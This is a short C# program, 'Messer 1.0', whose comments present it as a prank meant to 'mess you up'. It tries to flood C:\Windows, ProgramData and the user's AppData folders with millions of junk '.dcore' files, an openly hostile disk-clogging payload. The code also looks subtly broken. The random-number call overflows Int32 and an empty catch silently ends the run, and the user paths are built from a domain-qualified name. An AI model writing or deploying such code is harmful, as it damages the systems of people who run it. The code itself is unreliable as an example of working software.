
/* (c) All Rights Reserved, Dashies Software Inc. */

/* a little application because I can, it will just mess you up BRO! */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Messer_1._0 {
    class Program {
        private static int ReadMe = 0;
        private static Random getNumbah = new Random();
        private static String[] path_table = { "C:\\ProgramData\\",
                                               "C:\\Windows\\",
                                               "",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\Local\\",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\LocalLow\\",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\Roaming\\" };

        static void Main(string[] args) {
            try {
                for(int index = 0; index <= 500000000; index += 1) {
                    ReadMe = getNumbah.Next(Convert.ToInt32(900000000000000000), Convert.ToInt32(999999999999999999));
                
                    for(int subindex = 0; subindex <= path_table.Length-1; subindex += 1) {
                        String File = String.Empty;
                        File = path_table[subindex] + ReadMe + ".dcore";
                        System.IO.File.WriteAllText(File, "Dashieeeee powerrrssssss c:");
                    }
                }    
            } catch {
                return ;
            }
        }
    }
}
